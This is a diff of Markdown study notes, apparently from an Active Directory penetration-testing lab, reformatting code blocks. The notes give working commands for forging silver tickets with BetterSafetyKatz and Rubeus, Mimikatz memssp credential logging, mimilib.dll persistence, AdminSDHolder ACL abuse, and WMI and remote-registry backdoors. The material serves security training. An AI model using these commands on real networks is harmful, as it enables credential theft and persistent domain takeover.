@@ -124,15 +124,16 @@ You must specify the **Service Name** (SPN) you want to access.
 4. `HOST`: Scheduled Tasks.
     
 **Using BetterSafetyKatz:**
-    ```
-    BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<MachineNTLM> /startoffset:0 /ending:600 /renewmax:10080 /ptt" "exit"
-    ```
+  
+```
+BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<MachineNTLM> /startoffset:0 /ending:600 /renewmax:10080 /ptt" "exit"
+```
     
  **Using Rubeus:**
 
-    ```
-    C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<MachineNTLM> /sid:<DomainSID> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
-    ```
+```
+C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<MachineNTLM> /sid:<DomainSID> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+```
     
 
 ---
@@ -209,11 +210,11 @@ Once injected, **every time any user (including DAs) logs into that machine, the
     Invoke-Mimikatz -Command '"misc::memssp"'
     ```
     
-    - Logs to: `C:\Windows\system32\mimilsa.log`.
+ - Logs to: `C:\Windows\system32\mimilsa.log`.
         
 **Registry Modification (Persistent):**
     
-    Copy `mimilib.dll` to `System32` and add "mimilib" to the `Security Packages` registry key. This survives reboots.
+Copy `mimilib.dll` to `System32` and add "mimilib" to the `Security Packages` registry key. This survives reboots.
     
 
 ---
@@ -236,6 +237,7 @@ Active Directory has a self-healing mechanism called **SDProp** (Security Descri
 If we add our user (`student1`) to the ACL of **AdminSDHolder**, SDProp will automatically add us to the ACL of **Domain Admins** within an hour. This allows us to modify Domain Admin accounts (e.g., reset their passwords) indefinitely.
 
 **Protected Groups List:**
+
 ![image](/images/image%20137.png)
 
 **Well Known Abuse:**
@@ -246,7 +248,6 @@ If we add our user (`student1`) to the ACL of **AdminSDHolder**, SDProp will aut
 - In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it
   
   
-
 ### **Exploitation**
 
 **Step 1: Modify AdminSDHolder ACL**
@@ -258,7 +259,6 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc
 **Step 2: Force SDProp (Optional)**
 
 Wait 60 mins or force the run:
-
 
 ```
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
@@ -382,15 +382,15 @@ If you have Admin rights, you can weaken the security permissions (ACLs) of serv
 
 **WMI Backdoor:** Allows `student1` (Low Priv) to run `wmic` commands on the DC.
 
-    ```
-    Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
-    ```
+ ```
+ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+ ```
     
 **Remote Registry Backdoor:** Allows `student1` to dump LSA secrets remotely.
 
-    ```
-    Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
-    ```
+ ```
+  Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+ ```
     
 
 ---
